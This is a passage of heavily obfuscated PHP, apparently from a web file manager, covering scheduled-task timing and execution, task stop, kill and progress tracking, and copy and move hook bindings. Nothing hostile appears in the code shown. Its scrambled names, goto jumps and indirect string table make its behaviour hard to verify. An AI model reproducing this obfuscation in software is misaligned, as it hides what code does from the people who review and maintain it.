$F‘¬Îçõœû = count($C∫»»Ωã∆Ë); for ($F¿ß∏Æè˜¨ = 0; $F¿ß∏Æè˜¨ < $F‘¬Îçõœû; $F¿ß∏Æè˜¨++) { $dúÈ´ûÎßø = $C∫»»Ωã∆Ë[$F¿ß∏Æè˜¨]; if ($dúÈ´ûÎßø[$BáÁ≤˘»®î[1369]] != $BáÁ≤˘»®î[93]) { continue; } if (!self::taskTimeCheck($dúÈ´ûÎßø)) { continue; } self::taskRun($dúÈ´ûÎßø); } Hook::trigger($BáÁ≤˘»®î[1370]); } private static function taskTimeCheck($D≥ÖŸ€ÑŸ√) { goto D¥úÖÏíï´; A∂¨ç‘∑æ≈: $aä’Ç∏âôç = strtotime($c∏ç¯ÊÙõí[1371] . $a™á…‹≈…Á[$c∏ç¯ÊÙõí[1372]] . $c∏ç¯ÊÙõí[1373]) - strtotime($c∏ç¯ÊÙõí[1374]); $dè„√Ø˜’Í = time() - strtotime(date($c∏ç¯ÊÙõí[1375]) . $c∏ç¯ÊÙõí[1376]); $E™å§‡ëÍì = $dè„√Ø˜’Í >= $aä’Ç∏âôç && $dè„√Ø˜’Í <= $aä’Ç∏âôç + 3600; goto f°·€‘’Çé; f°·€‘’Çé: switch ($a™á…‹≈…Á[$c∏ç¯ÊÙõí[29]]) { case $c∏ç¯ÊÙõí[1377]: if (time() - $f‘øÜ÷¢™ﬁ < 3600 * 24 * 30) { return !1; } if ($a™á…‹≈…Á[$c∏ç¯ÊÙõí[1377]] == date($c∏ç¯ÊÙõí[1378]) && $E™å§‡ëÍì) { return !0; } break; case $c∏ç¯ÊÙõí[1379]: if (time() - $f‘øÜ÷¢™ﬁ < 3600 * 24 * 7) { return !1; } $f≤ËáÚÆÙÃ = date($c∏ç¯ÊÙõí[1380]) == 0 ? 7 : date($c∏ç¯ÊÙõí[1380]); if ($a™á…‹≈…Á[$c∏ç¯ÊÙõí[1379]] == $f≤ËáÚÆÙÃ && $E™å§‡ëÍì) { return !0; } break; case $c∏ç¯ÊÙõí[1372]: if (time() - $f‘øÜ÷¢™ﬁ < 3600 * 24) { return !1; } if ($E™å§‡ëÍì) { return !0; } break; case $c∏ç¯ÊÙõí[1381]: if (time() - $f‘øÜ÷¢™ﬁ >= floatval($a™á…‹≈…Á[$c∏ç¯ÊÙõí[1381]]) * 60) { return !0; } break; default: break; } return !1; goto cÿ¥∑ÊŸã‹; D¥úÖÏíï´: $c∏ç¯ÊÙõí =& $_SERVER[Æ¡î¢≠¯™]; $a™á…‹≈…Á = json_decode($D≥ÖŸ€ÑŸ√[$c∏ç¯ÊÙõí[197]], !0); $f‘øÜ÷¢™ﬁ = intval($D≥ÖŸ€ÑŸ√[$c∏ç¯ÊÙõí[1362]]); goto A∂¨ç‘∑æ≈; cÿ¥∑ÊŸã‹: } public static function taskRun($C÷úïû≈÷·) { goto bƒåŒÛ†Èı; cÂå≈Ò˘ü≈: $eà«¶∫è◊‰ = timeFloat(); $eêÚÁ≥ã = $A≤¶ªé∫…[33]; switch ($C÷úïû≈÷·[$A≤¶ªé∫…[29]]) { case $A≤¶ªé∫…[301]: $D≥ûÃ–ÒÜ„ = url_request($C÷úïû≈÷·[$A≤¶ªé∫…[1385]], $A≤¶ªé∫…[223], !1, !1, !1, !1, 5); $eêÚÁ≥ã = strlen($D≥ûÃ–ÒÜ„); break; case $A≤¶ªé∫…[222]: $eêÚÁ≥ã = Hook::apply($C÷úïû≈÷·[$A≤¶ªé∫…[1385]]); default: break; } goto fâªﬂ ·ÿ≠; fâªﬂ ·ÿ≠: Model($A≤¶ªé∫…[1386])->add(array($A≤¶ªé∫…[1387] => $A≤¶ªé∫…[33], $A≤¶ªé∫…[1388] => $A≤¶ªé∫…[472], $A≤¶ªé∫…[29] => $A≤¶ªé∫…[1389] . $C÷úïû≈÷·[$A≤¶ªé∫…[372]], $A≤¶ªé∫…[1390] => json_encode(array($A≤¶ªé∫…[28] => $C÷úïû≈÷·[$A≤¶ªé∫…[28]], $A≤¶ªé∫…[1391] => timeFloat() - $eà«¶∫è◊‰, $A≤¶ªé∫…[287] => $eêÚÁ≥ã)))); self::log($A≤¶ªé∫…[1392] . $C÷úïû≈÷·[$A≤¶ªé∫…[372]] . $A≤¶ªé∫…[1393] . $eêÚÁ≥ã); return !0; goto A⁄Ÿá¶»åØ; bƒåŒÛ†Èı: $A≤¶ªé∫… =& $_SERVER[Æ¡î¢≠¯™]; self::log($A≤¶ªé∫…[1382] . $C÷úïû≈÷·[$A≤¶ªé∫…[372]] . $A≤¶ªé∫…[1383] . $C÷úïû≈÷·[$A≤¶ªé∫…[28]] . $A≤¶ªé∫…[1384] . $C÷úïû≈÷·[$A≤¶ªé∫…[1385]]); Model($A≤¶ªé∫…[1368])->run($C÷úïû≈÷·[$A≤¶ªé∫…[372]]); goto cÂå≈Ò˘ü≈; A⁄Ÿá¶»åØ: } private static function valueGet($c¿Ï÷ÛÑÆ„) { $DÿÁäçüé  =& $_SERVER[Æ¡î¢≠¯™]; $bèéìµÉîÃ = $DÿÁäçüé [1394]; $eùëÑè˘°ë = Model($DÿÁäçüé [1395])->get($c¿Ï÷ÛÑÆ„, $bèéìµÉîÃ); if (is_null($eùëÑè˘°ë)) { Model($DÿÁäçüé [1395])->set($DÿÁäçüé [1366], 10, $bèéìµÉîÃ); Model($DÿÁäçüé [1395])->set($DÿÁäçüé [681], $DÿÁäçüé [93], $bèéìµÉîÃ); Model($DÿÁäçüé [1395])->set($DÿÁäçüé [1361], $DÿÁäçüé [472], $bèéìµÉîÃ); $eùëÑè˘°ë = Model($DÿÁäçüé [1395])->get($c¿Ï÷ÛÑÆ„, $bèéìµÉîÃ); } return $eùëÑè˘°ë; } private static function valueSet($B¢óõùí’Â, $FŒ—õ˜íÜ«) { $cﬁÈ¶√•ëÍ =& $_SERVER[Æ¡î¢≠¯™]; return Model($cﬁÈ¶√•ëÍ[1395])->set($B¢óõùí’Â, $FŒ—õ˜íÜ«, $cﬁÈ¶√•ëÍ[1394]); } protected static function log($a–Ãõ∑ßÔ”) { write_log($a–Ãõ∑ßÔ”, $_SERVER[Æ¡î¢≠¯™][1396]); } private static function cacheClear() { $a˜∞úª‰äÛ =& $_SERVER[Æ¡î¢≠¯™]; $BÎ™»ÍåÊú = Model($a˜∞úª‰äÛ[1395])->cacheKey($a˜∞úª‰äÛ[1394]); Cache::clearMemory($BÎ™»ÍåÊú); } } class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\165\x6e\156\151\156\x67"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($f›ÑﬁìÂ≥ö, $Fé∫ ”â—˘ = '', $eûÂå≈Ÿ∫† = 0, $CÉƒÌŒ¬†’ = '') { goto EÁÙÙ«¨Ó™; EÁÙÙ«¨Ó™: $a…ó∫˘Éπå =& $_SERVER[Æ¡î¢≠¯™]; if (self::get($f›ÑﬁìÂ≥ö)) { return; } $this->task = array($a…ó∫˘Éπå[372] => $f›ÑﬁìÂ≥ö, $a…ó∫˘Éπå[1397] => USER_ID, $a…ó∫˘Éπå[1305] => $CÉƒÌŒ¬†’, $a…ó∫˘Éπå[29] => $Fé∫ ”â—˘, $a…ó∫˘Éπå[966] => $a…ó∫˘Éπå[33], $a…ó∫˘Éπå[964] => $eûÂå≈Ÿ∫†, $a…ó∫˘Éπå[976] => 0, $a…ó∫˘Éπå[1398] => 0, $a…ó∫˘Éπå[1399] => 0, $a…ó∫˘Éπå[1400] => timeFloat(), $a…ó∫˘Éπå[1401] => 0, $a…ó∫˘Éπå[1402] => 0, $a…ó∫˘Éπå[1403] => 0, $a…ó∫˘Éπå[1404] => 0, $a…ó∫˘Éπå[681] => $a…ó∫˘Éπå[1361]); goto A˜ªÕ˜ö≥ò; fÉˆÀÇÔé’: Hook::trigger($a…ó∫˘Éπå[1408], $this->task); $this->task[$a…ó∫˘Éπå[1402]] = timeFloat(); self::valueSet($this->task[$a…ó∫˘Éπå[372]], $this->task); goto fÈÍ•ÆÙã´; A˜ªÕ˜ö≥ò: Hook::bind($a…ó∫˘Éπå[1363], array($this, $a…ó∫˘Éπå[1405])); Hook::bind($a…ó∫˘Éπå[1406], array($this, $a…ó∫˘Éπå[1407])); $this->startAfter(); goto fÉˆÀÇÔé’; fÈÍ•ÆÙã´: } public function end() { goto C•…ú»‹§ä; C•…ú»‹§ä: $DÒÉå≈µö =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->task) { return; } if ($this->task[$DÒÉå≈µö[1402]]) { self::valueSet($this->task[$DÒÉå≈µö[372]], !1); } goto FŸïÃ¯‘“Ü; FŸïÃ¯‘“Ü: $dÜ∆èŸıí÷ = timeFloat() - $this->task[$DÒÉå≈µö[1400]]; self::log($DÒÉå≈µö[1409] . $this->task[$DÒÉå≈µö[372]] . $DÒÉå≈µö[1410] . $dÜ∆èŸıí÷ . $DÒÉå≈µö[1411]); Hook::unbind($DÒÉå≈µö[1363], array($this, $DÒÉå≈µö[1405])); goto AÆ–¬Ò‚≤ª; AÆ–¬Ò‚≤ª: Hook::unbind($DÒÉå≈µö[1406], array($this, $DÒÉå≈µö[1407])); $this->endAfter(); $this->task = !1; goto fπî‡⁄÷¨∫; fπî‡⁄÷¨∫: } public function update($a–èºÂ≈ÿÀ = 0) { goto C»ã»ÓåÃ‹; Fä–Ó†ÔâÎ: Hook::trigger($bﬁáÀÜ‘¶Ù[1415], $bâêçï∫∞õ); self::valueSet($bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[372]], $bâêçï∫∞õ); goto Dîºﬁ∫âûı; f¢åﬂ–ﬁ”“: $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[976]] += $a–èºÂ≈ÿÀ; $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1401]] = timeFloat(); if ($bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[964]]) { if ($bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[964]] < $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[976]]) { $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[964]] = $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[976]]; } $d‰π˜——èá = timeFloat() - $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1400]] - $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1403]]; $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1398]] = $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[976]] / $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[964]]; $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1399]] = $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[976]] / $d‰π˜——èá; if ($bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1398]] > 0) { $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1404]] = $d‰π˜——èá * (1 - $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1398]]) / $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1398]]; } $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1404]] = $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1404]] <= 0 ? 0 : $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1404]]; } goto Eﬁ÷ÓâÒÖ™; c€”∞íçŸˆ: $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[681]] = $E ”ò≥…™ﬁ ? $E ”ò≥…™ﬁ : $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[681]]; $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1403]] = $EÉ¿÷à™¡ú[$bﬁáÀÜ‘¶Ù[1403]] ? $EÉ¿÷à™¡ú[$bﬁáÀÜ‘¶Ù[1403]] : 0; $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1402]] = timeFloat(); goto Fä–Ó†ÔâÎ; Eﬁ÷ÓâÒÖ™: $this->updateAfter(); $EÌ÷ﬂÌ•Ë◊ = 0.2; if (timeFloat() - $bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[1402]] < $EÌ÷ﬂÌ•Ë◊) { return; } goto c≥‡Ïä∫∂Ô; c≥‡Ïä∫∂Ô: $EÉ¿÷à™¡ú = self::get($bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[372]]); $E ”ò≥…™ﬁ = $EÉ¿÷à™¡ú[$bﬁáÀÜ‘¶Ù[681]]; if ($E ”ò≥…™ﬁ == self::STATYS_KILL) { $Cƒ—ÜèÉƒß = array($bﬁáÀÜ‘¶Ù[1412] => LNG($bﬁáÀÜ‘¶Ù[1413]), $bﬁáÀÜ‘¶Ù[1018] => !1); Cache::set($bﬁáÀÜ‘¶Ù[1414] . $this->task[$bﬁáÀÜ‘¶Ù[372]], $Cƒ—ÜèÉƒß, 30); $this->end(); die; } else { if ($E ”ò≥…™ﬁ == self::STATYS_STOP) { $E⁄ô¶ èè— = 2; $EÉ¿÷à™¡ú[$bﬁáÀÜ‘¶Ù[1403]] += $E⁄ô¶ èè—; self::valueSet($bâêçï∫∞õ[$bﬁáÀÜ‘¶Ù[372]], $EÉ¿÷à™¡ú); sleep($E⁄ô¶ èè—); $this->update(); return; } } goto c€”∞íçŸˆ; C»ã»ÓåÃ‹: $bﬁáÀÜ‘¶Ù =& $_SERVER[Æ¡î¢≠¯™]; $bâêçï∫∞õ =& $this->task; if (!$bâêçï∫∞õ) { return; } goto f¢åﬂ–ﬁ”“; Dîºﬁ∫âûı: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($F«·≤„ ∏¡) { $cèıâªô™á =& $_SERVER[Æ¡î¢≠¯™]; Cache::set($cèıâªô™á[1414] . $this->task[$cèıâªô™á[372]], $F«·≤„ ∏¡, 60); return $F«·≤„ ∏¡; } public static function get($Fùâ“ÿ“üî) { return self::valueGet($Fùâ“ÿ“üî); } public static function listData() { $Dçô˘Æﬂ»… = self::valueGet(); return array_sort_by($Dçô˘Æﬂ»…, $_SERVER[Æ¡î¢≠¯™][1400], !0); } public static function kill($dÕÁóÛàÒ¢) { return self::changeStatus($dÕÁóÛàÒ¢, self::STATYS_KILL); } public static function stop($a…∫Í·çÌÇ) { return self::changeStatus($a…∫Í·çÌÇ, self::STATYS_STOP); } public static function restart($A«àáÑáŸÏ) { return self::changeStatus($A«àáÑáŸÏ, self::STATYS_RUNNING); } public static function killAll() { $AäÚ…ﬁìÍÔ =& $_SERVER[Æ¡î¢≠¯™]; $EŸã¯Á⁄∫ò = self::listData(); foreach ($EŸã¯Á⁄∫ò as $fÇœ◊≈™⁄æ) { self::kill($fÇœ◊≈™⁄æ[$AäÚ…ﬁìÍÔ[372]]); } sleep(2); foreach ($EŸã¯Á⁄∫ò as $fÇœ◊≈™⁄æ) { self::valueSet($fÇœ◊≈™⁄æ[$AäÚ…ﬁìÍÔ[372]], !1); } } private static function changeStatus($eÙœÇÆ‘ùë, $A≤∂‹≥Ç’È) { goto fäÕˆ˜ÆﬂÛ; fäÕˆ˜ÆﬂÛ: $aÓ∫ù›ËÔ¨ =& $_SERVER[Æ¡î¢≠¯™]; $cñ∏àÆ¡∞Ç = self::valueGet($eÙœÇÆ‘ùë); if (!$cñ∏àÆ¡∞Ç) { return !1; } goto Bõ‰ƒæ≈ÈÕ; a≥Ûé⁄Ø¡: return !0; goto f‡öîèä”≈; Bõ‰ƒæ≈ÈÕ: $cñ∏àÆ¡∞Ç[$aÓ∫ù›ËÔ¨[681]] = $A≤∂‹≥Ç’È; self::valueSet($eÙœÇÆ‘ùë, $cñ∏àÆ¡∞Ç); self::log($aÓ∫ù›ËÔ¨[1416] . $cñ∏àÆ¡∞Ç[$aÓ∫ù›ËÔ¨[372]] . $aÓ∫ù›ËÔ¨[1417] . $A≤∂‹≥Ç’È); goto a≥Ûé⁄Ø¡; f‡öîèä”≈: } public static function valueGet($DÏ˘óóÓã± = false) { $c¢µÂòŒ©ç =& $_SERVER[Æ¡î¢≠¯™]; if ($DÏ˘óóÓã±) { $d”∂¯Õﬂ»Ò = Model($c¢µÂòŒ©ç[403])->where(array($c¢µÂòŒ©ç[99] => $DÏ˘óóÓã±, $c¢µÂòŒ©ç[29] => $c¢µÂòŒ©ç[1418]))->find(); return $d”∂¯Õﬂ»Ò ? json_decode($d”∂¯Õﬂ»Ò[$c¢µÂòŒ©ç[365]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($fÀ–Ú»ªËê = false) { goto bΩêßï‚Æı; bΩêßï‚Æı: $F¨Ø”õÓ≠ˆ =& $_SERVER[Æ¡î¢≠¯™]; $EÓ¶∫Ûﬂ” = array($F¨Ø”õÓ≠ˆ[29] => $F¨Ø”õÓ≠ˆ[1418]); if ($fÀ–Ú»ªËê) { $EÓ¶∫Ûﬂ”[$F¨Ø”õÓ≠ˆ[1397]] = $fÀ–Ú»ªËê; } goto bî¶Ç–Ωï›; bî¶Ç–Ωï›: $D°Ê®ü•±ﬂ = Model($F¨Ø”õÓ≠ˆ[403])->where($EÓ¶∫Ûﬂ”)->select(); $D°Ê®ü•±ﬂ = $D°Ê®ü•±ﬂ ? $D°Ê®ü•±ﬂ : array(); foreach ($D°Ê®ü•±ﬂ as $eÿ÷∏®Ù£∫ => $C€á∞ô≥„È) { $D°Ê®ü•±ﬂ[$eÿ÷∏®Ù£∫] = json_decode($C€á∞ô≥„È[$F¨Ø”õÓ≠ˆ[365]], !0); } goto bÛÍƒ‚Ñí°; bÛÍƒ‚Ñí°: return $D°Ê®ü•±ﬂ; goto D∏ïÉ©—◊¢; D∏ïÉ©—◊¢: } public static function valueSet($DÈ◊éí˜ÖÃ, $eû¢òèÊãó) { goto FªèÒ∏›¨; F®Çµó⁄ùï: if (!$BìÒÍ‚∂è±) { ob_start(); var_dump($eû¢òèÊãó); $F∫ÒﬂßıÉ† = ob_get_clean(); self::log($C…’≈¨–µ÷[1419] . json_encode_force($F∫ÒﬂßıÉ†)); } if (!$DÈ◊éí˜ÖÃ || !$eû¢òèÊãó[$C…’≈¨–µ÷[372]]) { return !1; } $E◊ÌáÂ≠Ì≥ = array($C…’≈¨–µ÷[29] => $C…’≈¨–µ÷[1418], $C…’≈¨–µ÷[1397] => USER_ID, $C…’≈¨–µ÷[99] => $DÈ◊éí˜ÖÃ, $C…’≈¨–µ÷[365] => $BìÒÍ‚∂è±); goto b’ª¬¬◊≠Ç; b’ª¬¬◊≠Ç: Model($C…’≈¨–µ÷[403])->add($E◊ÌáÂ≠Ì≥, array(), !0); goto aàû œ◊°∂; FªèÒ∏›¨: $C…’≈¨–µ÷ =& $_SERVER[Æ¡î¢≠¯™]; if (!$eû¢òèÊãó) { return Model($C…’≈¨–µ÷[403])->where(array($C…’≈¨–µ÷[99] => $DÈ◊éí˜ÖÃ, $C…’≈¨–µ÷[29] => $C…’≈¨–µ÷[1418]))->delete(); } $BìÒÍ‚∂è± = json_encode($eû¢òèÊãó); goto F®Çµó⁄ùï; aàû œ◊°∂: } public static function log($dÈí‚˜Ç·ƒ) { write_log($dÈí‚˜Ç·ƒ, $_SERVER[Æ¡î¢≠¯™][1420]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto B®’ŒöîåÚ; c◊ôô©À⁄˜: Hook::bind($BÖàƒÔ ÔÆ[547], array($this, $BÖàƒÔ ÔÆ[1429])); Hook::bind($BÖàƒÔ ÔÆ[513], array($this, $BÖàƒÔ ÔÆ[1430])); Hook::bind($BÖàƒÔ ÔÆ[510], array($this, $BÖàƒÔ ÔÆ[1430])); goto DÔ£å‰ªÚ±; DÔ£å‰ªÚ±: Hook::bind($BÖàƒÔ ÔÆ[515], array($this, $BÖàƒÔ ÔÆ[1430])); Hook::bind($BÖàƒÔ ÔÆ[517], array($this, $BÖàƒÔ ÔÆ[1430])); Hook::bind($BÖàƒÔ ÔÆ[519], array($this, $BÖàƒÔ ÔÆ[1430])); goto C≈∆è¿ ûÂ; C≈∆è¿ ûÂ: Hook::bind($BÖàƒÔ ÔÆ[1431], array($this, $BÖàƒÔ ÔÆ[1432])); Hook::bind($BÖàƒÔ ÔÆ[536], array($this, $BÖàƒÔ ÔÆ[1433])); $this->sourceModelCopyFlag = !1; goto D¨é⁄ƒµµØ; aËÌÉ—àÓé: Hook::bind($BÖàƒÔ ÔÆ[1421], array($this, $BÖàƒÔ ÔÆ[1422])); Hook::bind($BÖàƒÔ ÔÆ[1423], array($this, $BÖàƒÔ ÔÆ[1424])); Hook::bind($BÖàƒÔ ÔÆ[1425], array($this, $BÖàƒÔ ÔÆ[1426])); goto a≤ë˜ëò°ô; eåæÁù¶π¯: $EáïÏñõ¬∞[$BÖàƒÔ ÔÆ[966]] = $BÖàƒÔ ÔÆ[33]; $EáïÏñõ¬∞[$BÖàƒÔ ÔÆ[1444]] = $BÖàƒÔ ÔÆ[33]; $EáïÏñõ¬∞[$BÖàƒÔ ÔÆ[1445]] = 0; goto FÙô∑Éõƒ©; D¨é⁄ƒµµØ: Hook::bind($BÖàƒÔ ÔÆ[1434], array($this, $BÖàƒÔ ÔÆ[1435])); Hook::bind($BÖàƒÔ ÔÆ[1436], array($this, $BÖàƒÔ ÔÆ[1437])); Hook::bind($BÖàƒÔ ÔÆ[1438], array($this, $BÖàƒÔ ÔÆ[1439])); goto eƒèáÔ…Öü; FÙô∑Éõƒ©: if (!$EáïÏñõ¬∞[$BÖàƒÔ ÔÆ[1305]]) { $EáïÏñõ¬∞[$BÖàƒÔ ÔÆ[1305]] = LNG($BÖàƒÔ ÔÆ[1446]); } goto B›∞≥Ã∑œÁ; a≤ë˜ëò°ô: Hook::bind($BÖàƒÔ ÔÆ[543], array($this, $BÖàƒÔ ÔÆ[1427])); Hook::bind($BÖàƒÔ ÔÆ[544], array($this, $BÖàƒÔ ÔÆ[1428])); Hook::bind($BÖàƒÔ ÔÆ[546], array($this, $BÖàƒÔ ÔÆ[1429])); goto c◊ôô©À⁄˜; B®’ŒöîåÚ: $BÖàƒÔ ÔÆ =& $_SERVER[Æ¡î¢≠¯™]; $EáïÏñõ¬∞ =& $this->task; $this->sourceCopyFolder = !1; goto aËÌÉ—àÓé; eƒèáÔ…Öü: $EáïÏñõ¬∞[$BÖàƒÔ ÔÆ[1440]] = LNG($BÖàƒÔ ÔÆ[1441]); $EáïÏñõ¬∞[$BÖàƒÔ ÔÆ[1442]] = 0; $EáïÏñõ¬∞[$BÖàƒÔ ÔÆ[1443]] = 0; goto eåæÁù¶π¯; B›∞≥Ã∑œÁ: } protected function endAfter() { goto BÛ¡°ëÈØì; aÁ‘«ÜŒ•‹: Hook::unbind($dÆôâÿﬁú°[1425], array($this, $dÆôâÿﬁú°[1426])); Hook::unbind($dÆôâÿﬁú°[543], array($this, $dÆôâÿﬁú°[1427])); Hook::unbind($dÆôâÿﬁú°[544], array($this, $dÆôâÿﬁú°[1428])); goto Eäûœ¡◊≥ô; f¡€ã¨Ïëì: Hook::unbind($dÆôâÿﬁú°[1434], array($this, $dÆôâÿﬁú°[1435])); Hook::unbind($dÆôâÿﬁú°[1436], array($this, $dÆôâÿﬁú°[1437])); Hook::unbind($dÆôâÿﬁú°[1438], array($this, $dÆôâÿﬁú°[1439])); goto b”’Œ¡–äƒ; BÛ¡°ëÈØì: $dÆôâÿﬁú° =& $_SERVER[Æ¡î¢≠¯™]; Hook::unbind($dÆôâÿﬁú°[1421], array($this, $dÆôâÿﬁú°[1422])); Hook::unbind($dÆôâÿﬁú°[1423], array($this, $dÆôâÿﬁú°[1424])); goto aÁ‘«ÜŒ•‹; Eäûœ¡◊≥ô: Hook::unbind($dÆôâÿﬁú°[546], array($this, $dÆôâÿﬁú°[1429])); Hook::unbind($dÆôâÿﬁú°[547], array($this, $dÆôâÿﬁú°[1429])); Hook::unbind($dÆôâÿﬁú°[513], array($this, $dÆôâÿﬁú°[1430])); goto aÁâ©‚Ü’ÿ; a›π±¡∂â´: Hook::unbind($dÆôâÿﬁú°[519], array($this, $dÆôâÿﬁú°[1430])); Hook::unbind($dÆôâÿﬁú°[1431], array($this, $dÆôâÿﬁú°[1432])); Hook::unbind($dÆôâÿﬁú°[536], array($this, $dÆôâÿﬁú°[1433])); goto f¡€ã¨Ïëì; aÁâ©‚Ü’ÿ: Hook::unbind($dÆôâÿﬁú°[510], array($this, $dÆôâÿﬁú°[1430])); Hook::unbind($dÆôâÿﬁú°[515], array($this, $dÆôâÿﬁú°[1430])); Hook::unbind($dÆôâÿﬁú°[517], array($this, $dÆôâÿﬁú°[1430])); goto a›π±¡∂â´; b”’Œ¡–äƒ: } public function copyMoveStart($Fè£ÿé—°ø, $Bèâ¨ñ†úû, $FÍ®Ì¨„‹±, $f¯ÚÍÓ¿»ﬂ) { } public function updateAfter() { goto C¶ôﬁ¯Îµ´; C¶ôﬁ¯Îµ´: $F°ëâ‘∆éî =& $_SERVER[Æ¡î¢≠¯™]; $e’ïœúØÒ˘ =& $this->task; if (!$e’ïœúØÒ˘[$F°ëâ‘∆éî[690]]) { return; } goto a«‡¡≈òè ; Dê≤ÑØ™æå: $e’ïœúØÒ˘[$F°ëâ‘∆éî[1398]] = ($e’ïœúØÒ˘[$F°ëâ‘∆éî[1447]] + $FÖ™ºÕõÓ√) / $e’ïœúØÒ˘[$F°ëâ‘∆éî[690]]; if ($e’ïœúØÒ˘[$F°ëâ‘∆éî[1398]] > 0) { $Dÿ“ëÁ∑œ„ = timeFloat() - $e’ïœúØÒ˘[$F°ëâ‘∆éî[1400]] - $e’ïœúØÒ˘[$F°ëâ‘∆éî[1403]]; $e’ïœúØÒ˘[$F°ëâ‘∆éî[1404]] = $Dÿ“ëÁ∑œ„ * (1 - $e’ïœúØÒ˘[$F°ëâ‘∆éî[1398]]) / $e’ïœúØÒ˘[$F°ëâ‘∆éî[1398]]; } goto C´ﬂÒÿ©∆Ê; a«‡¡≈òè : if ($this->sourceModelCopyFlag) { return; } $FÖ™ºÕõÓ√ = 0; if ($e’ïœúØÒ˘[$F°ëâ‘∆éî[1444]] == $F°ëâ‘∆éî[1026]) { $FÖ™ºÕõÓ√ = $e’ïœúØÒ˘[$F°ëâ‘∆éî[1443]] * 0.5; } else { if ($e’ïœúØÒ˘[$F°ëâ‘∆éî[1444]] == $F°ëâ‘∆éî[101]) { $FÖ™ºÕõÓ√ = $e’ïœúØÒ˘[$F°ëâ‘∆éî[1443]] * 0.5 + $e’ïœúØÒ˘[$F°ëâ‘∆éî[1442]] * 0.5; } } goto Dê≤ÑØ™æå; C´ﬂÒÿ©∆Ê: } public function addPath($e©ÑÏÛéåŸ) { goto cë⁄¡ÛÏ‰´; fÙùÛïﬂ€¥: if ($CΩ¡⁄‘úùà[$cÚ˘§È¨—é[29]] == $cÚ˘§È¨—é[174]) { $dÑòóÇÆÉê[$cÚ˘§È¨—é[964]] += 1; } else { $dÑòóÇÆÉê[$cÚ˘§È¨—é[964]] += $CΩ¡⁄‘úùà[$cÚ˘§È¨—é[90]][$cÚ˘§È¨—é[88]]; if ($CΩ¡⁄‘úùà[$cÚ˘§È¨—é[374]]) { $dÑòóÇÆÉê[$cÚ˘§È¨—é[964]] += $CΩ¡⁄‘úùà[$cÚ˘§È¨—é[90]][$cÚ˘§È¨—é[89]] + 1; } } $dÑòóÇÆÉê[$cÚ˘§È¨—é[690]] += $CΩ¡⁄‘úùà[$cÚ˘§È¨—é[87]]; $this->update(); goto aè“€èóÊí; CÈı¬œÙâˆ: $CΩ¡⁄‘úùà = IO::infoWithChildren($e©ÑÏÛéåŸ); $eâ ´‘ˆ’ﬂ = $dÑòóÇÆÉê[$cÚ˘§È¨—é[1448]] ? $dÑòóÇÆÉê[$cÚ˘§È¨—é[1448]][$cÚ˘§È¨—é[1449]] : 0; $dÑòóÇÆÉê[$cÚ˘§È¨—é[1448]] = array($cÚ˘§È¨—é[1449] => $eâ ´‘ˆ’ﬂ + 1, $cÚ˘§È¨—é[391] => $CΩ¡⁄‘úùà[$cÚ˘§È¨—é[28]], $cÚ˘§È¨—é[85] => $CΩ¡⁄‘úùà[$cÚ˘§È¨—é[85]], $cÚ˘§È¨—é[470] => $CΩ¡⁄‘úùà[$cÚ˘§È¨—é[470]] ? $CΩ¡⁄‘úùà[$cÚ˘§È¨—é[470]] : $CΩ¡⁄‘úùà[$cÚ˘§È¨—é[85]]); goto fÙùÛïﬂ€¥; cë⁄¡ÛÏ‰´: $cÚ˘§È¨—é =& $_SERVER[Æ¡î¢≠¯™]; if (!$e©ÑÏÛéåŸ) { return; } $dÑòóÇÆÉê =& $this->task; goto CÈı¬œÙâˆ; aè“€èóÊí: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($cÉãµ™¯·é) { $a‰ìßÊ¯∂ã =& $_SERVER[Æ¡î¢≠¯™]; $C§–‰œ∫©ﬁ =& $this->task; $C§–‰œ∫©ﬁ[$a‰ìßÊ¯∂ã[1440]] = $cÉãµ™¯·é[$a‰ìßÊ¯∂ã[28]]; $C§–‰œ∫©ﬁ[$a‰ìßÊ¯∂ã[966]] = $cÉãµ™¯·é[$a‰ìßÊ¯∂ã[28]]; $this->update(); } public function copyFileStart($BπÀÒ¬ øœ, $dÒ∞ﬁıÕ©±, $e“ÉÍ¡Ø⁄à, $Cœ§Èè¬ó, $fÖÖ∑Ãºù‘, $bå”ÕÙ∂ê“) { goto BÃáó•üœ–; BÃáó•üœ–: $FÊ√…‡◊¿ì =& $_SERVER[Æ¡î¢≠¯™]; $D¥ˆö≥£Îª = $fÖÖ∑Ãºù‘; if ($D¥ˆö≥£Îª 